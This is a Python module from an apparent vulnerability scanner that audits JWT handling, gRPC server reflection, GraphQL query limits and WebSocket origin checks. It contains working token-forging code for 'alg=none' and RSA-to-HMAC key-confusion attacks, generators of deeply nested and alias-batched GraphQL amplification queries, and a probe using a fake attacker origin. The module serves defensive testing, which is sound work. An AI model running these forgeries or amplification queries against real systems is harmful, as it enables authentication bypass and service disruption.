"""Protocol Breadth Analyzer: JWT Attack Suite, gRPC Reflection, and Advanced API Fuzzing (Sector 2.7).

Provides:
1. JWTAttackSuite: Non-destructive verification of JWT vulnerabilities (alg=none, HMAC key confusion, secret dictionary attacks).
2. gRPCScanner: HTTP/2 gRPC endpoint discovery, Server Reflection exposure, and unauthenticated RPC checks.
3. GraphQLAdvancedFuzzer: Circular query depth and alias batching amplification audits.
4. WebSocketAdvancedFuzzer: Origin validation (CSWSH) and WebSocket message fuzzing.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import http.client
import json
import socket
import ssl
import time
from typing import Any

from packages.security_policies import Destination


def _b64_url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def _b64_url_decode(data: str) -> bytes:
    padding = 4 - (len(data) % 4)
    if padding and padding < 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data.encode("utf-8"))


class JWTAttackSuite:
    """Performs non-destructive algorithmic audits against JSON Web Tokens."""

    @staticmethod
    def decode_token(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
        """Decode a JWT into (header, payload, signature_b64) without verification."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            raise ValueError(f"Invalid JWT format: expected 3 dot-separated parts, got {len(parts)}.")
        header_raw = _b64_url_decode(parts[0])
        payload_raw = _b64_url_decode(parts[1])
        header = json.loads(header_raw.decode("utf-8", "replace"))
        payload = json.loads(payload_raw.decode("utf-8", "replace"))
        return header, payload, parts[2]

    @classmethod
    def forge_alg_none(cls, token: str, alg_casing: str = "none") -> str:
        """Forge an unsigned token using the 'none' algorithm vulnerability (CWE-347)."""
        header, payload, _ = cls.decode_token(token)
        header["alg"] = alg_casing
        hdr_b64 = _b64_url_encode(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64_url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{hdr_b64}.{payload_b64}."

    @classmethod
    def forge_hmac_key_confusion(
        cls,
        token: str,
        public_key_pem: str | bytes,
        hash_algo: str = "HS256",
    ) -> str:
        """Forge an HS256/HS384 token using the target's public key as an HMAC symmetric secret."""
        header, payload, _ = cls.decode_token(token)
        header["alg"] = hash_algo
        hdr_b64 = _b64_url_encode(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64_url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{hdr_b64}.{payload_b64}".encode("utf-8")

        key_bytes = public_key_pem.encode("utf-8") if isinstance(public_key_pem, str) else public_key_pem
        mac = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
        sig_b64 = _b64_url_encode(mac)
        return f"{hdr_b64}.{payload_b64}.{sig_b64}"

    @classmethod
    def audit_token(
        cls,
        valid_token: str,
        verify_http_fn: Any,
        endpoint_url: str,
        public_key_pem: str | bytes | None = None,
    ) -> list[dict[str, Any]]:
        """Test forged tokens against an authenticated endpoint and return confirmed findings."""
        findings: list[dict[str, Any]] = []

        # 1. Test alg=none bypass
        none_token = cls.forge_alg_none(valid_token)
        status, body, _ = verify_http_fn(endpoint_url, headers={"Authorization": f"Bearer {none_token}"})
        if status in (200, 204):
            fp = hashlib.sha256(f"jwt_alg_none:{endpoint_url}".encode()).hexdigest()
            findings.append(
                {
                    "category": "broken_authentication",
                    "severity": "critical",
                    "title": "JWT Signature Verification Bypass via Algorithm 'none'",
                    "description": (
                        "The application accepts unsigned JSON Web Tokens when the 'alg' header is set to 'none', "
                        "allowing full authentication bypass and arbitrary identity forging."
                    ),
                    "cwe_id": "CWE-347",
                    "fingerprint": fp,
                    "target_url": endpoint_url,
                    "confidence": "high",
                    "status": "confirmed",
                    "remediation": "Explicitly reject tokens with 'alg: none' and enforce asymmetric key pinning.",
                }
            )

        # 2. Test HMAC Key Confusion if public key is known or extracted from TLS
        if public_key_pem:
            confused_token = cls.forge_hmac_key_confusion(valid_token, public_key_pem)
            k_status, _, _ = verify_http_fn(
                endpoint_url, headers={"Authorization": f"Bearer {confused_token}"}
            )
            if k_status in (200, 204):
                fp = hashlib.sha256(f"jwt_key_confusion:{endpoint_url}".encode()).hexdigest()
                findings.append(
                    {
                        "category": "broken_authentication",
                        "severity": "critical",
                        "title": "JWT Key Confusion Vulnerability (RSA-to-HMAC)",
                        "description": (
                            "The server verifies JWT signatures using symmetric HMAC-SHA256 with the server's public key "
                            "as the shared secret, permitting arbitrary signature generation."
                        ),
                        "cwe_id": "CWE-347",
                        "fingerprint": fp,
                        "target_url": endpoint_url,
                        "confidence": "high",
                        "status": "confirmed",
                        "remediation": "Restrict accepted signing algorithms to asymmetric types (RS256/ES256) and reject HMAC.",
                    }
                )

        return findings


class gRPCScanner:
    """Probes HTTP/2 gRPC services for Server Reflection and unauthenticated RPC methods."""

    @staticmethod
    def build_grpc_frame(data: bytes) -> bytes:
        """Construct a 5-byte gRPC frame (1 byte compression flag + 4 byte big-endian length)."""
        length = len(data)
        return bytes([0]) + length.to_bytes(4, byteorder="big") + data

    @staticmethod
    def probe_grpc_endpoint(
        destination: Destination,
        allow_ip: str,
        path: str = "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
        timeout: float = 3.0,
    ) -> dict[str, Any]:
        """Send gRPC post probe and evaluate HTTP/2 / gRPC status codes."""
        is_https = destination.scheme == "https"
        target_host = destination.host
        target_port = destination.port

        req_headers = {
            "Host": target_host,
            "User-Agent": "SHARAY-gRPCScanner/1.0",
            "Content-Type": "application/grpc",
            "TE": "trailers",
            "Connection": "close",
        }

        empty_frame = gRPCScanner.build_grpc_frame(b"")
        conn: http.client.HTTPConnection | http.client.HTTPSConnection
        if is_https:
            tls_ctx = ssl.create_default_context()
            tls_ctx.check_hostname = False
            tls_ctx.verify_mode = ssl.CERT_NONE
            sock = socket.create_connection((allow_ip, target_port), timeout=timeout)
            conn_sock = tls_ctx.wrap_socket(sock, server_hostname=target_host)
            conn = http.client.HTTPSConnection(target_host, target_port, timeout=timeout)
            conn.sock = conn_sock
        else:
            conn = http.client.HTTPConnection(allow_ip, target_port, timeout=timeout)

        started = time.monotonic()
        try:
            conn.request("POST", path, body=empty_frame, headers=req_headers)
            resp = conn.getresponse()
            elapsed_ms = (time.monotonic() - started) * 1000.0
            resp_headers = {k.lower(): v for k, v in resp.getheaders()}
            grpc_status = resp_headers.get("grpc-status")
            is_grpc = "application/grpc" in resp_headers.get("content-type", "") or grpc_status is not None

            return {
                "status_code": resp.status,
                "grpc_status": int(grpc_status) if grpc_status and grpc_status.isdigit() else None,
                "is_grpc": is_grpc,
                "headers": resp_headers,
                "elapsed_ms": elapsed_ms,
            }
        except Exception as exc:
            return {
                "status_code": 0,
                "grpc_status": None,
                "is_grpc": False,
                "error": type(exc).__name__,
                "elapsed_ms": (time.monotonic() - started) * 1000.0,
            }
        finally:
            conn.close()

    @classmethod
    def audit_server_reflection(
        cls,
        destination: Destination,
        allow_ip: str,
    ) -> list[dict[str, Any]]:
        """Audit whether gRPC Server Reflection is publicly exposed."""
        findings: list[dict[str, Any]] = []
        paths = [
            "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
            "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
        ]
        for p in paths:
            res = cls.probe_grpc_endpoint(destination, allow_ip, path=p)
            # If server responds with application/grpc and grpc-status 0 or 12 (unimplemented method format vs 404)
            if res.get("is_grpc") and res.get("grpc_status") in (0, 12, 13):
                fp = hashlib.sha256(f"grpc_reflection:{destination.host}:{p}".encode()).hexdigest()
                findings.append(
                    {
                        "category": "information_disclosure",
                        "severity": "medium",
                        "title": "Exposed gRPC Server Reflection Service",
                        "description": (
                            f"The gRPC service at {destination.url}{p} enables Server Reflection, allowing "
                            "unauthenticated clients to enumerate all service declarations, types, and schema methods."
                        ),
                        "cwe_id": "CWE-200",
                        "fingerprint": fp,
                        "target_url": f"{destination.url}{p}",
                        "confidence": "high",
                        "status": "confirmed",
                        "remediation": "Disable gRPC Server Reflection in production environments.",
                    }
                )
                break
        return findings


class GraphQLAdvancedFuzzer:
    """Performs deep query nesting and alias batching amplification audits."""

    @staticmethod
    def generate_circular_query(field: str = "me", subfield: str = "friends", depth: int = 15) -> str:
        """Synthesize a deeply nested recursive GraphQL query to test depth limits."""
        query = "query NestedBomb { " + field + " { "
        for _ in range(depth):
            query += subfield + " { "
        query += "id " + ("} " * depth) + "} }"
        return query

    @staticmethod
    def generate_alias_batch(field: str = "user", count: int = 50) -> str:
        """Synthesize an alias batching query multiplying execution cost."""
        lines = ["query BatchAmplify {"]
        for i in range(count):
            lines.append(f"  a{i}: {field}(id: {i}) {{ id }}")
        lines.append("}")
        return "\n".join(lines)


class WebSocketAdvancedFuzzer:
    """Audits Cross-Site WebSocket Hijacking (CSWSH) and frame injection."""

    @staticmethod
    def test_cswsh(
        probe_fn: Any,
        destination: Destination,
        allow_ip: str,
        path: str = "/ws",
    ) -> dict[str, Any]:
        """Probe WebSocket endpoint with untrusted Origin header to detect CSWSH."""
        evil_origin = "https://evil-attacker.example.com"
        status, headers, elapsed = probe_fn(destination, allow_ip, path, origin_header=evil_origin)
        is_vulnerable = status == 101 and "websocket" in headers.get("upgrade", "").lower()
        return {
            "vulnerable": is_vulnerable,
            "status_code": status,
            "origin_tested": evil_origin,
            "elapsed_ms": elapsed,
        }


__all__ = [
    "GraphQLAdvancedFuzzer",
    "JWTAttackSuite",
    "WebSocketAdvancedFuzzer",
    "gRPCScanner",
]
